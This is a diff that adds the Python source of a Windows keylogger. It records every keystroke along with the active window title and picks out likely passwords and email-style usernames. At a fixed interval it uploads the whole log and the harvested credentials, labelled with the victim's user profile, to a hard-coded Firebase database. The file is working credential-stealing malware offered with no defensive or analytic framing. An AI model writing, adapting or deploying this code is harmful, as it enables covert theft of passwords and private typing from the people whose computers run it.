@@ -1,0 +1,134 @@
+import os
+import keyboard #keylogs
+from threading import Semaphore, Timer
+from datetime import datetime
+import requests
+from firebase import firebase
+import threading
+import win32gui
+
+send_interval= 10 #1 min
+firebase = firebase.FirebaseApplication('https://unessay-41a88.firebaseio.com/', None)
+
+class Keylogger:
+    def __init__(self, interval):
+        self.interval = interval
+        self.log = []
+        self.semaphore = Semaphore(0)
+
+        self.passwords = []
+        self.passwords_very_sure = []
+        self.all_strings = []
+        self.potential_user = []
+        self.current_string = ''
+        self.shift = False
+    
+    def checkPass(self, s):
+        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        toAppend = window + ":" +s 
+        if len(s) != 0:
+            self.all_strings.append(self.current_string)
+            if(len(s) >= 8):
+                self.passwords.append(toAppend)
+
+            containDigit = False
+            upperCase = False
+            containsSym = False
+            
+            for i in s:
+                if i.isdigit():
+                    containDigit = True
+                if i.isupper():
+                    upperCase = True
+                if i.isalpha():
+                    containsSym = True
+            if(containDigit and upperCase and containsSym):
+                self.passwords_very_sure.append(toAppend)
+                
+            if(s.find('@') != -1 and s.find('.') != -1):
+                print(True)
+                self.potential_user.append(toAppend)
+        
+    
+    def callback(self, event):
+        name = event.name
+        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        if len(name) == 1:
+            self.current_string += name
+
+        elif len(name) > 1:
+            name = name.replace(" ", "_")
+            name = f"[{name.lower()}]"
+            if (name == '[space]' or name == "[tab]" or name == "[enter]"):
+                
+                self.checkPass(self.current_string)
+                self.current_string =  ""
+
+            elif name == '[backspace]':
+                self.current_string = self.current_string[:-1]
+
+        time = datetime.now()
+        if name == "~":
+            name = '[wiggle-hyphen]'
+        self.log.append(time.strftime("%m/%d/%Y %H:%M:%S") + ' WINDOW: ' + window + " key: " + name)
+        
+    def fire_post(self, name, data):
+
+        result = firebase.get('person', None)
+        #print(result)
+        if(result != None):
+            for i in result:
+                if (result[i]['user']) == name:
+                    data['keystroke'] += ("~" + result[i]['keystroke'])
+                    data['passwords'] += ("~" + result[i]['passwords'])
+                    data['potential password'] += ("~" +result[i]['potential password'])
+                    data['username'] += ("~" + result[i]['username'])
+                    data['all strings'] += ("~" + result[i]['all strings'])
+                    firebase.delete('person', i)
+
+        firebase.post('person', data, {'print': 'silent'})
+
+
+    def postData(self):
+        
+        name = os.environ['USERPROFILE']
+        data = {
+            'user' : name,
+            'keystroke'  : "~".join(self.log),
+            'passwords' : "~".join(self.passwords),
+            'potential password' : "~".join(self.passwords_very_sure),
+            'username' : "~".join(self.potential_user),
+            'all strings': "~".join(self.all_strings)
+        }
+
+        thread = threading.Thread(target = self.fire_post, args = (name, data))
+        thread.start()
+        
+        #print(self.passwords, self.passwords_very_sure, self.all_strings,  self.potential_user,  self.log )
+        #self.passwords = {}
+        #self.passwords_very_sure = {}
+        self.passwords = []
+        self.passwords_very_sure = []
+        self.all_strings = []
+        #self.potential_user = {}
+        self.potential_user = []
+        self.log = []
+        
+
+    def report(self):   
+        if self.log:
+            self.postData()
+        timer = Timer(self.interval,self.report)
+        timer.start()
+
+        
+    def run (self):
+        keyboard.on_release(self.callback)
+        self.report()
+        self.semaphore.acquire()
+    
+if __name__=='__main__':
+    keylogger = Keylogger(send_interval)
+    keylogger.run()
+    
+
